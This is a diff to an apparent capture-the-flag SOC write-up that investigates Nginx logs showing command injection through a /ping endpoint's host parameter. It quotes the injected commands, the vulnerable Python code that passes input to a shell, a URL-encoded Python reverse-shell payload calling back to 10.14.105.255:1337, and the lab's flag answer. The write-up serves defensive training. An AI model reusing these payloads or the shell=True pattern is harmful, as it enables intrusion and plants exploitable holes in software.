@@ -754,30 +754,62 @@ The investigation focuses on:
 
 ### Step 1 — Review the Nginx Access Log
 
-I began by reviewing the Nginx access log to identify suspicious requests against the web application.
+I began by reviewing the Nginx access log to establish a baseline of activity against the `/ping` endpoint and identify requests that differed from normal application use.
 
 ```bash
 cat /var/log/nginx/access.log
 ```
 
-While reviewing the requests, I noticed activity from the same external IP address:
+The first two requests appeared consistent with normal use of the application. Both supplied an IP address to the `host` parameter:
 
 ```text
-10.14.105.255
+10.2.33.10 - - [19/Aug/2025:12:26:07 +0000] "GET /ping?host=3.109.33.76 HTTP/1.1" 200 312 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_6_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+10.12.88.67 - - [23/Aug/2025:09:32:22 +0000] "GET /ping?host=54.36.19.83 HTTP/1.1" 200 287 "-" "curl/7.54.1"
 ```
+
+I then identified a sequence of requests from the same source IP address, `10.14.105.255`, occurring within a short period:
+
+```text
+10.14.105.255 - - [26/Aug/2025:20:09:43 +0000] "GET /ping?host=hello HTTP/1.1" 500 21 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+10.14.105.255 - - [26/Aug/2025:20:09:46 +0000] "GET /ping?host=whoami HTTP/1.1" 500 21 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+10.14.105.255 - - [26/Aug/2025:20:09:49 +0000] "GET /ping?host=;whoami HTTP/1.1" 200 81 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+10.14.105.255 - - [26/Aug/2025:20:10:41 +0000] "GET /ping?host=;ls HTTP/1.1" 200 78 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+10.14.105.255 - - [26/Aug/2025:20:10:45 +0000] "GET /ping?host=;pwd HTTP/1.1" 200 85 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139/0.0.0 Safari/537.36"
+10.14.105.255 - - [26/Aug/2025:20:10:49 +0000] "GET /ping?host=;cat+/opt/trypingme/main.py HTTP/1.1" 200 330 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+```
+
+The sequence is important from a SOC investigation perspective.
+
+The requests progressed from:
+
+```text
+hello
+   ↓
+whoami
+   ↓
+;whoami
+   ↓
+;ls
+   ↓
+;pwd
+   ↓
+;cat+/opt/trypingme/main.py
+```
+
+The first two requests returned HTTP `500` responses. After the attacker introduced the semicolon (`;`), the requests returned HTTP `200` responses.
+
+A successful HTTP `200` response alone does not prove that an injected command executed successfully. However, the change in request structure, the repeated use of shell commands, the common source IP, and the progression from basic testing to file access provide multiple indicators that the application was being tested for command injection.
+
+The commands also have distinct investigative value:
+
+- `whoami` can identify the user context under which a command is executing.
+- `ls` can enumerate files and directories.
+- `pwd` can identify the current working directory.
+- `cat` can read the contents of a file.
+
+This sequence is consistent with reconnaissance followed by an attempt to access application source code.
 
 ![Task 4 Question 1 - The Path](Task-4Question-1-thepath.png)
-
-The requests were targeting the `/ping` endpoint and included values such as:
-
-```text
-GET /ping?host=hello HTTP/1.1
-GET /ping?host=whoami HTTP/1.1
-```
-
-The `whoami` request stood out because `whoami` is a Linux command used to identify the current user.
-
-This suggested that the attacker may have been testing whether input supplied to the `host` parameter was being interpreted as a system command.
 
 ### Step 2 — Search for Python File References
 
@@ -791,11 +823,17 @@ grep -E "\.py" /var/log/nginx/access.log
 
 The escaped period (`\.`) searches for the literal `.py` extension rather than treating `.` as a regular-expression wildcard.
 
-This reduces the large access log to requests that reference Python files, making it easier to identify the file involved in the attack.
+This is a useful investigative technique because instead of manually reviewing every entry in the access log, I can filter for requests that contain a specific file type associated with Python source code.
+
+The result identifies the request containing:
+
+```text
+/opt/trypingme/main.py
+```
 
 ### Step 3 — Identify the Suspicious Request
 
-The search revealed the following request:
+The relevant Nginx entry was:
 
 ```text
 10.14.105.255 - - [26/Aug/2025:20:10:49 +0000] "GET /ping?host=;cat+/opt/trypingme/main.py HTTP/1.1" 200 330 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
@@ -807,17 +845,23 @@ The important portion is:
 host=;cat+/opt/trypingme/main.py
 ```
 
-This is significant because the attacker is no longer simply supplying a hostname or IP address to the `/ping` function.
+The `+` represents a space within the URL query parameter. The parameter can therefore be interpreted as:
 
-Instead, the `host` parameter contains a shell command:
+```text
+host=;cat /opt/trypingme/main.py
+```
+
+The semicolon is significant because it can be used to terminate one shell command and introduce another command.
+
+In this case, the attacker appears to be attempting to inject:
 
 ```text
 cat /opt/trypingme/main.py
 ```
 
-The `cat` command is commonly used on Linux to read and display the contents of a file.
+into the application's command execution.
 
-Therefore, the request indicates an attempt to use the application's `host` parameter to execute a command that would read a Python source file from the server.
+The `cat` command is commonly used on Linux to read and display file contents. The targeted file is the application's Python source code.
 
 ### Step 4 — Trace the Evidence to the File
 
@@ -835,15 +879,51 @@ cat
 /opt/trypingme/main.py
 ```
 
-The semicolon is significant because it can be used to separate commands in a shell command line.
-
-The attacker therefore appears to have attempted to inject a command into the `host` parameter and use `cat` to open/read the Python source file.
-
 The file path is directly visible in the request:
 
 ```text
 /opt/trypingme/main.py
 ```
+
+At this point, the investigation has established a logical progression:
+
+```text
+External Source
+      ↓
+10.14.105.255
+      ↓
+/ping endpoint
+      ↓
+host parameter
+      ↓
+Shell metacharacter (;)
+      ↓
+Command injection testing
+      ↓
+cat command
+      ↓
+/opt/trypingme/main.py
+```
+
+This is stronger evidence than simply identifying a suspicious string in isolation because the surrounding requests show the attacker first testing command execution and then using the same technique to target a specific application file.
+
+### Step 5 — Confirm the Targeted File
+
+I then examined the identified file directly on the Linux host:
+
+```bash
+cat /opt/trypingme/main.py
+```
+
+The file contents were returned, confirming that the path identified in the Nginx request corresponds to the Python application source.
+
+The terminal also displayed:
+
+```text
+cat: HTTP/1.1: No such file or directory
+```
+
+This occurred because `HTTP/1.1` was included as an additional argument to the local `cat` command. The error does not change the fact that `/opt/trypingme/main.py` was successfully displayed before `cat` attempted to process `HTTP/1.1` as another file.
 
 ### Conclusion
 
@@ -851,23 +931,37 @@ The Nginx access log provides a direct connection between the suspicious `/ping`
 
 The evidence shows:
 
-- **Source:** `10.14.105.255`
-- **Endpoint:** `/ping`
+- **Source IP:** `10.14.105.255`
+- **Target endpoint:** `/ping`
 - **Parameter:** `host`
+- **Injection character:** `;`
 - **Command:** `cat`
 - **Target file:** `/opt/trypingme/main.py`
+- **HTTP response:** `200`
 
-The request demonstrates an attempted command injection through the `/ping` endpoint, with the attacker attempting to use `cat` to read the Python source file.
+The preceding `whoami`, `ls`, and `pwd` requests provide additional context showing a progression from command-execution testing to filesystem reconnaissance and finally source-code access.
 
 **Answer:** `/opt/trypingme/main.py`
 
+</td>
+</tr>
+</table>
+
+---
+
+<table width="120%">
+<tr>
+<td width="100%">
+
 ## Question 2 — Looking inside the opened file, what's the flag you see there?
+
+**Question:** Looking inside the opened file, what's the flag you see there?
 
 **Answer:** `THM{i_am_vulnerable!}`
 
 ### Investigation
 
-Since Question 1 identified `/opt/trypingme/main.py` as the file the attacker attempted to read, I next inspected that file to determine what information may have been exposed:
+Since Question 1 identified `/opt/trypingme/main.py` as the file the attacker attempted to read, I next inspected the file contents to determine what information was exposed.
 
 ```bash
 cat /opt/trypingme/main.py
@@ -885,9 +979,134 @@ The source code revealed the following comment:
 
 The flag was embedded directly within the Python application's source code.
 
+### Application-Level Root Cause
+
+The source code also revealed why the application was vulnerable to command injection:
+
+```python
+@app.get("/ping", response_class=HTMLResponse)
+def ping(host: str):
+
+    # TODO: Add security checks
+    # THM{i_am_vulnerable!}
+    cmd = f"ping -c 2 {host}"
+    result = subprocess.check_output(cmd, shell=True)
+    response = f"<h3>Checking the host: {host}</h3>\n"
+    response += f"<pre>{result.decode()}</pre>"
+    return response
+```
+
+The application accepts the `host` parameter directly from the web request:
+
+```text
+/ping?host=<user-controlled input>
+```
+
+That value is then inserted directly into the command:
+
+```python
+cmd = f"ping -c 2 {host}"
+```
+
+The command is subsequently executed using:
+
+```python
+subprocess.check_output(cmd, shell=True)
+```
+
+This combination is the critical security issue.
+
+Because `host` is controlled by the user and the resulting string is executed through a shell, shell metacharacters can potentially change the intended command.
+
+For example, the attacker's request:
+
+```text
+host=;whoami
+```
+
+introduces a semicolon before the additional command.
+
+Likewise:
+
+```text
+host=;cat+/opt/trypingme/main.py
+```
+
+attempts to append a `cat` command that reads the application source code.
+
+### Connecting the Application Code to the Log Evidence
+
+The application source code provides the technical explanation for the behavior observed in the Nginx access log.
+
+The log showed:
+
+```text
+GET /ping?host=;whoami HTTP/1.1
+GET /ping?host=;ls HTTP/1.1
+GET /ping?host=;pwd HTTP/1.1
+GET /ping?host=;cat+/opt/trypingme/main.py HTTP/1.1
+```
+
+The application code shows:
+
+```text
+host
+ ↓
+f"ping -c 2 {host}"
+ ↓
+subprocess.check_output(...)
+ ↓
+shell=True
+```
+
+Together, these two sources provide stronger evidence than either source alone.
+
+The **Nginx access log** establishes what was submitted to the public-facing application.
+
+The **Python source code** explains how that input reached the operating-system shell.
+
+This allows the investigation to move from suspicious web requests to identification of the underlying application-level vulnerability.
+
+### Additional Evidence of Post-Exploitation Attempt
+
+The access log also contains a later request from the same source IP attempting to execute a Python command that creates a network connection to `10.14.105.255` on port `1337`:
+
+```text
+10.14.105.255 - - [26/Aug/2025:20:12:16 +0000] "GET /ping?host=;python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.14.105.255%22%2C1337%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27 HTTP/1.1" 504 578 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+```
+
+The URL-encoded request contains a Python command that attempts to create a TCP socket, connect to `10.14.105.255:1337`, redirect standard input/output/error through the socket, and spawn a shell.
+
+The HTTP response was `504`, indicating a gateway timeout. This response alone does not prove that the reverse-shell attempt succeeded.
+
+From a SOC investigation perspective, the appropriate conclusion is that the attacker **attempted to establish a reverse shell** after successfully identifying and reading the application's source code.
+
+This represents a significant escalation in the observed activity:
+
+```text
+Command Execution Testing
+        ↓
+System Reconnaissance
+        ↓
+Application Source Code Access
+        ↓
+Attempted Reverse Shell
+```
+
 ### Conclusion
 
-The Nginx access log showed an attempted command injection targeting `/opt/trypingme/main.py`. After identifying the targeted file, I inspected its contents and found the flag embedded in the source code.
+The Nginx access log showed an attempted command injection targeting `/opt/trypingme/main.py`. Inspection of the file revealed the flag and exposed the application's vulnerable command-execution logic.
+
+The Python source confirmed that user-controlled input was inserted directly into a shell command and executed with `shell=True`.
+
+The investigation therefore connects the evidence across multiple layers:
+
+- **Web server logs** identified the attacker's requests.
+- **Command sequence** showed progressive testing and reconnaissance.
+- **Application source code** confirmed the command-injection vulnerability.
+- **File access** demonstrated attempted source-code disclosure.
+- **Later network command** showed an attempted reverse-shell connection.
+- **HTTP 504 response** indicates a timeout but does not independently confirm successful shell access.
 
 **Answer:** `THM{i_am_vulnerable!}`
 
